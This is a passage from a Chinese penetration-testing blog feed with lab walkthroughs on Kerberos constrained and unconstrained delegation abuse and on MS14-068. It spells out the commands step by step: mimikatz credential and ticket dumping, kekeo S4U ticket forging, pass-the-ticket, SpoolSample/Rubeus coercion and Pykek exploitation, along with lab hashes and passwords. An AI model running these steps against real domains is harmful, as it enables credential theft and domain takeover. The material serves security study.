title="kekeo.exe结合存在约束委派的域用户明文密码申请可转发的TGT票据"></a>kekeo.exe结合存在约束委派的域用户明文密码申请可转发的TGT票据</h6><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">kekeo # tgt::ask /<span class="hljs-keyword">user</span>:win2016 /<span class="hljs-keyword">domain</span>:vulntarget.com /<span class="hljs-keyword">password</span>:<span class="hljs-keyword">Admin</span>#<span class="hljs-number">123</span><br></code></pre></td></tr></table></figure><p><img src="/2022/03/04/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/渗透资料\github文章me\kerberos\image-20220215113137733.png" alt="image-20220215113137733"></p><h6 id="kekeo-exe结合存在约束委派的域用户的NTLM申请可转发的TGT票据"><a href="#kekeo-exe结合存在约束委派的域用户的NTLM申请可转发的TGT票据" class="headerlink" title="kekeo.exe结合存在约束委派的域用户的NTLM申请可转发的TGT票据"></a>kekeo.exe结合存在约束委派的域用户的NTLM申请可转发的TGT票据</h6><p>利用mimikatz拿到域用户win2016的NTLM hash进行利用</p><p><img src="/2022/03/04/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/渗透资料\github文章me\kerberos\image-20220215113407517.png" alt="image-20220215113407517"></p><p>这里  明文密码 和  hash  任选其一来操作 申请TGT</p><blockquote><p>kekeo # tgt::ask /user:win2016 /domain:vulntarget.com /NTLM:dfc8d2bfa540a0a6e2248a82322e654e</p></blockquote><p><img src="/2022/03/04/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/渗透资料\github文章me\kerberos\image-20220215113638058.png" alt="image-20220215113638058"></p><h6 id="利用kekeo进行S4U伪造-申请TGS服务票据"><a href="#利用kekeo进行S4U伪造-申请TGS服务票据" class="headerlink" title="利用kekeo进行S4U伪造 申请TGS服务票据"></a>利用kekeo进行S4U伪造 申请TGS服务票据</h6><p>利用拿到的TGT票据通过伪造s4u请求以administrator用户身份请求访问域控机的cifs服务 也就是前面的win2019</p><blockquote><p>tgs::s4u /tgt:<a href="mailto:&#x54;&#71;&#84;&#95;&#x77;&#105;&#110;&#x32;&#48;&#49;&#54;&#x40;&#x56;&#85;&#x4c;&#78;&#x54;&#65;&#82;&#x47;&#69;&#x54;&#x2e;&#x43;&#x4f;&#x4d;&#95;&#x6b;&#x72;&#98;&#116;&#x67;&#116;">&#x54;&#71;&#84;&#95;&#x77;&#105;&#110;&#x32;&#48;&#49;&#54;&#x40;&#x56;&#85;&#x4c;&#78;&#x54;&#65;&#82;&#x47;&#69;&#x54;&#x2e;&#x43;&#x4f;&#x4d;&#95;&#x6b;&#x72;&#98;&#116;&#x67;&#116;</a>~vulntarget.com@VULNTARGET.COM.kirbi /user:<a href="mailto:&#65;&#100;&#109;&#105;&#110;&#x69;&#x73;&#x74;&#114;&#97;&#116;&#x6f;&#x72;&#64;&#118;&#x75;&#108;&#110;&#x74;&#x61;&#x72;&#103;&#101;&#116;&#46;&#99;&#111;&#x6d;">&#65;&#100;&#109;&#105;&#110;&#x69;&#x73;&#x74;&#114;&#97;&#116;&#x6f;&#x72;&#64;&#118;&#x75;&#108;&#110;&#x74;&#x61;&#x72;&#103;&#101;&#116;&#46;&#99;&#111;&#x6d;</a> /service:cifs/win2019.vulntarget.com</p></blockquote><p><img src="/2022/03/04/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/渗透资料\github文章me\kerberos\image-20220215113831607.png" alt="image-20220215113831607"></p><h6 id="PTT利用拿到的TGS票据"><a href="#PTT利用拿到的TGS票据" class="headerlink" title="PTT利用拿到的TGS票据"></a>PTT利用拿到的TGS票据</h6><p>通过mimikatz进行ptt拿到域控机的cifs服务使用权限</p><blockquote><p>kerberos::ptt <a href="mailto:&#84;&#71;&#83;&#95;&#65;&#x64;&#x6d;&#x69;&#x6e;&#x69;&#x73;&#x74;&#x72;&#x61;&#x74;&#x6f;&#x72;&#64;&#x76;&#117;&#x6c;&#110;&#x74;&#97;&#114;&#103;&#101;&#x74;&#46;&#99;&#111;&#109;">&#84;&#71;&#83;&#95;&#65;&#x64;&#x6d;&#x69;&#x6e;&#x69;&#x73;&#x74;&#x72;&#x61;&#x74;&#x6f;&#x72;&#64;&#x76;&#117;&#x6c;&#110;&#x74;&#97;&#114;&#103;&#101;&#x74;&#46;&#99;&#111;&#109;</a>@VULNTARGET.COM_cifs~win2019.vulntarget.com@VULNTARGET.COM.kirbi</p></blockquote><p><img src="/2022/03/04/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/渗透资料\github文章me\kerberos\image-20220215113909034.png" alt="image-20220215113909034"></p><p>注:此处使用的通过S4U2proxy 拿到的 TGS票据，而不是使用通过S4U2self拿到的TGS票据。</p><p>查看域控机的共享目录成功！</p><p><img src="/2022/03/04/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/渗透资料\github文章me\kerberos\image-20220215113956538.png" alt="image-20220215113956538"></p><h5 id="域主机存在约束委派"><a href="#域主机存在约束委派" class="headerlink" title="域主机存在约束委派:"></a>域主机存在约束委派:</h5><p>通过mimikatz拿到域主机win2016的服务账户NTLM hash来申请可转发的TGT票据</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">privilege::debug<br>sekurlsa::logonpasswords<br></code></pre></td></tr></table></figure><p>注:需要管理员权限才可拿到密码Hash</p><p><img src="/2022/03/04/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/渗透资料\github文章me\kerberos\image-20220215120213597.png" alt="image-20220215120213597"></p><h6 id="kekeo-exe结合存在约束委派的域主机的服务账户的NTLM申请可转发的TGT"><a href="#kekeo-exe结合存在约束委派的域主机的服务账户的NTLM申请可转发的TGT" class="headerlink" title="kekeo.exe结合存在约束委派的域主机的服务账户的NTLM申请可转发的TGT"></a>kekeo.exe结合存在约束委派的域主机的服务账户的NTLM申请可转发的TGT</h6><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">tgt</span>::ask /user:win<span class="hljs-number">2016</span>$ /domain:vulntarget.com /NTLM:e<span class="hljs-number">0</span>cd<span class="hljs-number">419213811</span>fd<span class="hljs-number">910</span>ca<span class="hljs-number">6</span>c<span class="hljs-number">3</span>c<span class="hljs-number">42</span>d<span class="hljs-number">764</span>e<span class="hljs-number">7</span><br></code></pre></td></tr></table></figure><p><img src="/2022/03/04/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/渗透资料\github文章me\kerberos\image-20220215120223916.png" alt="image-20220215120223916"></p><p>注:带有$符号的用户一般都是服务主机账户，而非普通用户</p><h6 id="通过kekeo进行S4U伪造"><a href="#通过kekeo进行S4U伪造" class="headerlink" title="通过kekeo进行S4U伪造"></a>通过kekeo进行S4U伪造</h6><p>如此，成功拿到了对应委派服务的TGS票据</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">kekeo <span class="hljs-comment"># tgs::s4u /tgt:TGT_win2016$<span class="hljs-doctag">@VULNTARGET</span>.COM_krbtgt~vulntarget.com<span class="hljs-doctag">@VULNTARGET</span>.COM.kirbi /user:A</span><br></code></pre></td></tr></table></figure><p><img src="/2022/03/04/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/渗透资料\github文章me\kerberos\image-20220215120255259.png" alt="image-20220215120255259"></p><h6 id="PTT利用拿到的TGS票据-1"><a href="#PTT利用拿到的TGS票据-1" class="headerlink" title="PTT利用拿到的TGS票据"></a>PTT利用拿到的TGS票据</h6><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">kerberos::ptt TGS_Administrator<span class="hljs-variable">@vulntarget</span>.com<span class="hljs-variable">@VULNTARGET</span>.COM_cifs~win2019.vulntarget.com<span class="hljs-variable">@VULNTARGET</span>.COM.kirbi<br></code></pre></td></tr></table></figure><p><img src="/2022/03/04/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/渗透资料\github文章me\kerberos\image-20220215120311877.png" alt="image-20220215120311877"></p><p>尝试对域控进行共享目录访问,利用成功！</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">dir</span> \\win2019.vulntarget.com\c<span class="hljs-variable">$</span><br></code></pre></td></tr></table></figure><p><img src="/2022/03/04/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/渗透资料\github文章me\kerberos\image-20220215120322866.png" alt="image-20220215120322866"></p><p>注: 此处进行tgs::s4u伪造时，申请的service是cifs/win2019.vulntarget.com时；我们在使用时就应该是dir \win2019.vulntarget.com\c$ 这样才能访问成功，若dir \win2019\c$则会访问失败，反之亦然！</p><h3 id="关于约束委派的防御方法："><a href="#关于约束委派的防御方法：" class="headerlink" title="关于约束委派的防御方法："></a>关于约束委派的防御方法：</h3><p>1、高权限用户没有在特殊要求之下设置为不可委派，比如administrator</p><p><img src="/2022/03/04/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/渗透资料\github文章me\kerberos\image-20220215121324029.png" alt="image-20220215121324029"></p>]]></content>
    
    
    <categories>
      
      <category>内网</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>非约束委派</title>
    <link href="/2022/03/04/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/"/>
    <url>/2022/03/04/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/</url>
    
    <content type="html"><![CDATA[<h2 id="域委派是什么及其由来"><a href="#域委派是什么及其由来" class="headerlink" title="域委派是什么及其由来"></a>域委派是什么及其由来</h2><p>域委派是指：<strong>将域内用户的权限委派给服务账号，使得服务账号能以用户权限开展域内活动</strong></p><p><strong>懂一个东西的产生，肯定要先知道为什么会产生这个东西？</strong></p><p>在Windows 2000 Server首次发布Active Directory时，Microsoft必须提供一种简单的机制来支持用户通过kerberos向web server进行身份验证并需要代表该用户更新后端数据库服务器上的记录的方案。这通常称为”kerberos双跳问题”，并且要求进行委派，以便web server在修改数据库记录时模拟用户。</p><p><strong>这里说的”以便web server在修改数据库记录时模拟用户” 需要如何理解？</strong></p><p>我自己理解的是就比如数据库中的相关数据需要修改，如果此时如果是让当前的web server的服务账户去进行修改的话，那么也就无法记录到到底是谁去修改了这个数据，此时如果出了问题就不知道该去问谁了，这种业务情况下就可能就是需要委派这种功能来进行解决，那么委派之后的情况就是，让当前的web server的服务账户去操作，但是web server同样带有客户的信息，在修改相关数据的时候，用的是对应客户操作者的记录。</p><p>这里还需要注意的一点就是<strong>接受委派的用户只能是服务账户或者主机账户</strong></p><p>在域内只有主机账号和服务账号才有委派属性主机账号：</p><p>1、机器账户：活动目录中的computers组内的计算机，也被称为机器账号。</p><p><img src="/2022/03/04/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220215003209352.png" alt="image-20220215003209352"></p><p>2、服务账号：域内用户的一种类型，是服务器运行服务时所用的账号，将服务运行起来加入域内，比如：SQLServer，MYSQL等，还有就是域用户通过注册SPN也能成为服务账号。</p><p>服务账号（Service Account），域内用户的一种类型，服务器运行服务时所用的账号，将服务运行起来并加入域。就比如 SQL Server在安装时，会在域内自动注册服务账号SqlServiceAccount，这类账号不能用于交互式登录。</p><h2 id="非约束性委派（Unconstrained-Delegation）"><a href="#非约束性委派（Unconstrained-Delegation）" class="headerlink" title="非约束性委派（Unconstrained Delegation）"></a>非约束性委派（Unconstrained Delegation）</h2><p>通俗来讲就是 ：</p><p>​        在域中如果出现A使用Kerberos身份验证访问域中的服务B,而B再利用A的身份去请求域中的服务C，这个过程就可以理解为委派</p><p>一个经典例子：参考Y4er</p><p><img src="/2022/03/04/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220215003017928.png" alt="image-20220215003017928"></p><p>jack需要登陆到后台文件服务器，经过Kerberos认证的过程如下：</p><ol><li>jack以Kerberos协议认证登录，将凭证发送给websvc</li><li>websvc使用jack的凭证向KDC发起Kerberos申请TGT。</li><li>KDC检查websvc的委派属性，如果websvc可以委派，则返回可转发的jack的TGT。</li><li>websvc收到可转发TGT之后，使用该TGT向KDC申请可以访问后台文件服务器的TGS票据。</li><li>KDC检查websvc的委派属性，如果可以委派，并且权限允许，那么返回jack访问服务的TGS票据。</li><li>websvc使用jack的服务TGS票据请求后台文件服务器。</li></ol><p>微软的非约束委派的请求流程图如下所示</p><p><img src="/2022/03/04/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220215004244702.png" alt="image-20220215004244702"></p><ol><li>用户通过发送KRB_AS_REQ消息请求TGT1  <strong>(TGT1是用户访问service1的票据)</strong></li><li>KDC在KRB_AS_REP消息中返回TGT1</li><li>用户再通过TGT1向KDC请求转发TGT2（这里的TGT2跟TGT1不同，这里的TGT2票据属性中存在<strong>可转发的标记Forwarded</strong>）</li><li>在KRB_TGS_REP消息中返回转发TGT2（<strong>可转发的标记Forwarded</strong>）</li><li>用户使用TGT1向KDC申请访问Service1的ST（服务票据）</li><li>TGS返回给用户一个ST（服务票据）</li></ol><p>到第六步这里，其实大家都看到了就是一个完整的kerberos票据验证流程，唯一有一个不同，那就是在请求了TGT1票据之后还会再去请求另一张TGT2票据，这个TGT2的票据跟TGT1唯一的不同点就是带有”可转发的标记Forwarded</p><p>7.用户发送KRB_AP_REQ请求至Service1，这个请求中包含了TGT1和ST（服务票据）、TGT2、TGT2的Session key</p><p>在第七步的时候可以看到，发送给Service1的时候会发送了相关的TGT1 ST 和 TGT2 TGT2的Session key，需要注意的就是这里的TGT2（可转发的标记） TGT2的Session key会被存储到Service1中用于之后的请求</p><p>8.<strong>Service1使用用户的TGT2（可转发的标记）通过KRB_TGS_REQ发送给KDC，以用户的名义请求能够访问Service2的票据ST2</strong></p><p>9.KDC在KRB_TGS_REP消息中返回Service2到Service1的票据ST2</p><p>10.Service1以客户的名义用ST2发送KRB_AP_REQ请求</p><p>为什么是以客户的名义呢？个人理解就是因为上面我们说的TGT2（可转发的标记）来请求Service2。</p><p>11.Service2响应步骤10中Service1的请求</p><p>12.Service1响应步骤7中用户的请求</p><p>13.<strong>在这个过程中的TGT转发机制，没有限制Service1对TGT2的使用，也就是说Service1可以通过TGT2来请求任意服务</strong></p><p>14.KDC返回步骤13中请求的票据，15和16即为Service1通过模拟用户来访问其他ServiceXXXX</p><p>当user访问service1时，如果service1的服务账号如果开启了Unconstrained Delegation（非约束委派），<strong>则当user访问service1时会将user的TGT（带有可转发标记）发送给service1并保存在内存中以备下次重用</strong>，然后service1 就可以利用这张TGT以user的身份去访问域内的任何服务（<strong>任何服务是指user能访问的服务</strong>）了。</p><p>说在简单点就是：</p><p>比如：service1配置了非约束性委派，用户A需要委派service1来访问service2。这个service1可以是主机账户。</p><p>那么非约束性委派的过程可以大概理解为：</p><p>用户A向KDC申请一张可转发的用户A自己的TGT与访问service1需要的ticket。<br>用户A将第一步得到的ticket与可转发的tgt与tgt中的session key一起发送给了service1.<br>service1使用那张tgt与session key来代表用户A行使后续操作例如访问service2.</p><h2 id="非约束委派的利用"><a href="#非约束委派的利用" class="headerlink" title="非约束委派的利用"></a>非约束委派的利用</h2><p>主机账户的非约束委派利用：</p><p>一台 WIN-BING-PC 机器名称的机器</p><p><img src="/2022/03/04/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220215013337904.png" alt="image-20220215013337904"></p><p>通过adFind进行查询，也可以看到此时已经被设置为了非约束委派</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">adFind</span> -<span class="hljs-keyword">b</span> dc<span class="hljs-symbol">=hengge</span>,dc<span class="hljs-symbol">=com</span> -f <span class="hljs-string">&quot;(&amp;(objectCategory=computer)(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> -<span class="hljs-meta">dn</span><br></code></pre></td></tr></table></figure><p><img src="/2022/03/04/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220215013410246.png" alt="image-20220215013410246"></p><p>然后域控再次访问 WIN-BING-PC 这台机器，通过命令<code>dir //WIN-BING-PC/c$</code>，走是的kerberos的cifs协议</p><p><img src="/2022/03/04/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220215013447343.png" alt="image-20220215013447343"></p><p>然后导出 WIN-BING-PC 机器中的票据</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::tickets /export&quot;</span> <span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure><p>结果发现没有相关的administrator的票据kirbi</p><p><img src="/2022/03/04/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220215013516853.png" alt="image-20220215013516853"></p><p>接着我用域控通过命令来访问<code>Enter-PSSession -ComputerName WIN-BING-PC</code></p><p><img src="/2022/03/04/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220215013531752.png" alt="image-20220215013531752"></p><p>然后导出 WIN-BING-PC 机器中的票据</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::tickets /export&quot;</span> <span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure><p>然后会看到一张基于导出了相关的域控中administrator的高权限票据</p><p><img src="/2022/03/04/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220215013544159.png" alt="image-20220215013544159"></p><p>访问域控 dc1.hengge.com ，可以看到当前没有权限访问</p><p><img src="/2022/03/04/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220215013555394.png" alt="image-20220215013555394"></p><p>然后这里来进行导入票据访问，可以发现成功进行访问了</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">mimikatz <span class="hljs-string">&quot;kerberos::ptt [0;7f4a8]-2-0-60a10000-Administrator@krbtgt-HENGGE.COM.kirbi&quot;</span> <span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure><p><img src="/2022/03/04/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220215013617993.png" alt="image-20220215013617993"></p><h3 id="服务账号的非约束委派利用"><a href="#服务账号的非约束委派利用" class="headerlink" title="服务账号的非约束委派利用"></a>服务账号的非约束委派利用</h3><p><strong>实验环境：</strong></p><blockquote><p>域：YUNYING.LAB</p><p>域控：WindowsServer 2008 R2 x64(DC)：用户Administrator</p><p>域内主机：WindowsServer 2008 R2 x64(s2)：用户tsvc</p></blockquote><p><strong>所需工具：</strong></p><blockquote><p>Mimikatz</p></blockquote><p><strong>实验流程：</strong></p><p>在域中只有服务账户才能有委派功能，所以先把用户tsvc设置为服务账号。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">setspn</span> -U -Avariant/golden tsvc<br></code></pre></td></tr></table></figure><p>通过setspn -l tsvc查看配置成功。</p><p><img src="/2022/03/04/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220215014121992.png" alt="image-20220215014121992"></p><p>然后在“AD用户和计算机”中将tsvc设置为非约束委派模式</p><p><img src="/2022/03/04/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220215014141813.png" alt="image-20220215014141813"></p><p>此时在域控上使用Administrator访问tsvc所在主机S2的SMB服务。</p><p><img src="/2022/03/04/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220215014154251.png" alt="image-20220215014154251"></p><p>我们在S2上通过mimikatz可以导出Administrator发送过来的TGT内容。这里需要使用管理员权限打开mimikatz，然后通过privilege::debug命令提升权限，如果没有提升权限会报kuhl_m_sekurlsa_acquireLSA错误。再使用sekurlsa::tickets/export命令导出内存中所有的票据。</p><p><img src="/2022/03/04/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220215014206262.png" alt="image-20220215014206262"></p><p>可以看到名称为[0;9bec9]<a href="mailto:&#45;&#x32;&#x2d;&#48;&#x2d;&#x36;&#x30;&#x61;&#x30;&#x30;&#48;&#48;&#48;&#45;&#x41;&#x64;&#109;&#105;&#x6e;&#x69;&#115;&#116;&#114;&#x61;&#116;&#111;&#114;&#x40;&#107;&#x72;&#98;&#116;&#x67;&#x74;&#45;&#x59;&#85;&#x4e;&#x59;&#x49;&#78;&#71;&#x2e;&#76;&#x41;&#x42;&#x2e;&#x6b;&#105;&#114;&#x62;&#105;">&#45;&#x32;&#x2d;&#48;&#x2d;&#x36;&#x30;&#x61;&#x30;&#x30;&#48;&#48;&#48;&#45;&#x41;&#x64;&#109;&#105;&#x6e;&#x69;&#115;&#116;&#114;&#x61;&#116;&#111;&#114;&#x40;&#107;&#x72;&#98;&#116;&#x67;&#x74;&#45;&#x59;&#85;&#x4e;&#x59;&#x49;&#78;&#71;&#x2e;&#76;&#x41;&#x42;&#x2e;&#x6b;&#105;&#114;&#x62;&#105;</a>的这一条即为Administrator发送的TGT。</p><p>此时访问域控被拒绝。</p><p><img src="/2022/03/04/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220215014215791.png" alt="image-20220215014215791"></p><p>通过</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">kerberos::ptt <span class="hljs-literal">[<span class="hljs-number">0</span>;<span class="hljs-number">9</span><span class="hljs-identifier">bec9</span>]</span>-<span class="hljs-number">2</span>-<span class="hljs-number">0</span>-<span class="hljs-number">60</span>a00000-Administrator@krbtgt-<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">YUNYING</span>.</span><span class="hljs-module"><span class="hljs-identifier">LAB</span>.</span></span>kirbi<br></code></pre></td></tr></table></figure><p>命令将TGT内容导入到当前会话中，其实这也是一次Pass The Ticket攻击（有兴趣的可以了解一下）。</p><p>通过kerberos::list查看当前会话可以看到票据已经导入到当前会话。</p><p><img src="/2022/03/04/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220215014230146.png" alt="image-20220215014230146"></p><p>导入之后已经可以访问域控的共享目录。也就是说每当存在用户访问tsvc的服务时，tsvc的服务就会将访问者的TGT保存在内存中，可以通过这个TGT访问这个TGT所属用户的所有服务。</p><h2 id="非约束委派-Spooler打印机服务"><a href="#非约束委派-Spooler打印机服务" class="headerlink" title="非约束委派+Spooler打印机服务"></a>非约束委派+Spooler打印机服务</h2><p>环境：DM可委派，DC是域控。</p><p>利用Windows打印系统远程协议（MS-RPRN）中的一种旧的但是默认启用的方法，在该方法中，域用户可以使用MS-RPRN <code>RpcRemoteFindFirstPrinterChangeNotification(Ex)</code>方法强制任何运行了Spooler服务的计算机以通过Kerberos或NTLM对攻击者选择的目标进行身份验证。</p><p>工具：<a href="https://github.com/leechristensen/SpoolSample">https://github.com/leechristensen/SpoolSample</a></p><p>议题文章地址：<a href="https://www.slideshare.net/harmj0y/derbycon-the-unintended-risks-of-trusting-active-directory">https://www.slideshare.net/harmj0y/derbycon-the-unintended-risks-of-trusting-active-directory</a></p><p>需要以域用户运行SpoolSample，需要开启Print Spooler服务，该服务默认自启动。</p><p><img src="/2022/03/04/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220215014745102.png" alt="image-20220215014745102"></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">SpoolSample</span>.</span></span>exe DC DM<br></code></pre></td></tr></table></figure><p>使DC强制访问DM认证，同时使用rubeus监听来自DC的4624登录日志</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">Rubeus.exe<span class="hljs-built_in"> monitor </span>/interval:1 /filteruser:dc$<br></code></pre></td></tr></table></figure><p><img src="/2022/03/04/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220215014758924.png" alt="image-20220215014758924"></p><p>使用Rubues导入base64的ticket</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">.<span class="hljs-regexp">/Rubeus.exe ptt /</span>ticket:base64<br></code></pre></td></tr></table></figure><p>此时导出的ticket就有DC的TGT了</p><p><img src="/2022/03/04/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220215014811204.png" alt="image-20220215014811204"></p><p>用mimikatz ptt就完事</p><p><img src="/2022/03/04/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220215014822213.png" alt="image-20220215014822213"></p><p>参考：<a href="https://y4er.com/post/kerberos-unconstrained-delegation/">https://y4er.com/post/kerberos-unconstrained-delegation/</a></p><p><a href="https://www.freebuf.com/articles/neopoints/198381.html">https://www.freebuf.com/articles/neopoints/198381.html</a></p><p><a href="https://www.cnblogs.com/zpchcbd/p/12939246.html">https://www.cnblogs.com/zpchcbd/p/12939246.html</a></p>]]></content>
    
    
    <categories>
      
      <category>内网</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MS14068</title>
    <link href="/2022/03/04/MS14068/"/>
    <url>/2022/03/04/MS14068/</url>
    
    <content type="html"><![CDATA[<p>MS14068 是一个能够使普通用户提权到域控权限的权限提升漏洞。攻击者可以通过构 造特定的请求包来达到提升权限的目的。首先我们来说一下利用方式。</p><h3 id="1、利用方式"><a href="#1、利用方式" class="headerlink" title="1、利用方式"></a>1、利用方式</h3><p>实验环境：</p><p>域：YUNYING.LAB</p><blockquote><p>域控：WindowsServer 2008 R2 x64(DC)</p><p>域内主机：Windows7 x64(s1):域帐户ts1</p></blockquote><p>所需工具：</p><blockquote><p>Pykek</p><p>mimikatz</p></blockquote><p>攻击流程：</p><p>实验之前需要在域控主机查看是否安装了KB3011780补丁，可通过systeminfo来查看。</p><p>一、首先在域内主机s1上通过dir来访问域控的共享文件夹，示拒绝访问。</p><p><img src="/2022/03/04/MS14068/image-20220214223157361.png" alt="image-20220214223157361"></p><p>二、通过Pykek工具利用漏洞，我这里使用的是将python脚本编译之后的exe文件。</p><p>参数说明：</p><blockquote><p>-u 域账号+@+域名称，这里是ts1+@+yunying.lab</p><p>-p 为当前用户的密码，即ts1的密码</p><p>-s为ts1的SID值，可以通过whoami/all来获取用户的SID值</p><p>-d为当前域的域控</p></blockquote><p><img src="/2022/03/04/MS14068/image-20220214223234344.png" alt="image-20220214223234344"></p><p>脚本执行成功会在当前目录下生成一个 ccache 文件。</p><p><img src="/2022/03/04/MS14068/image-20220214223245875.png" alt="image-20220214223245875"></p><p>三、使用 mimikatz 导入生成的 ccache 文件，导入之前 cmd 下使用命令 klist purge 或者在 mimikatz 中使用 kerberos::purge 删除当前缓存的 kerberos 票据。</p><p><img src="/2022/03/04/MS14068/image-20220214223257254.png" alt="image-20220214223257254"></p><p>再次 dir 访问域控共享已经可以成功访问。</p><p><img src="/2022/03/04/MS14068/image-20220214223310314.png" alt="image-20220214223310314"></p><h3 id="2、漏洞原理"><a href="#2、漏洞原理" class="headerlink" title="2、漏洞原理"></a>2、漏洞原理</h3><p>MS14068工具在使用过程中抓包可以看到s1和域控192.168.254.130（实质上是与安装在域控上的KDC）有KRB_AS_REQ、KRB_AS_REP、KRB_TGS_REQ、KRB_TGS_REP四次交互。</p><p><img src="/2022/03/04/MS14068/image-20220214223340645.png" alt="image-20220214223340645"></p><p>下面根据流程和工具源码来看漏洞是如何利用的：</p><p><strong>KRB_AS_REQ</strong></p><p>首先程序通过build_as_req函数构建AS_REQ，在这里可以看到，参数pac_request设置为false。</p><p><img src="/2022/03/04/MS14068/image-20220214223410656.png" alt="image-20220214223410656"></p><p>也就是说设置了这个参数之后会向 KDC 申请一张不包含 PAC 的 TGT 票据，这是微软默 认的设计，在下列链接中有详细说明。 <a href="https://docs.microsoft.com/en-us/previous-versions/aa302203(v=msdn.10)#securityconsiderations">https://docs.microsoft.com/en-us/previous-versions/aa302203(v=msdn.10)#securityconsiderations</a></p><p><img src="/2022/03/04/MS14068/image-20220214223437888.png" alt="image-20220214223437888"></p><p>通过 PCAP 包可以更直观的看到在 AS-REQ 请求中的 include-pac:False 字段。这是造成这个漏 洞的第一个因素。</p><p><img src="/2022/03/04/MS14068/image-20220214223450215.png" 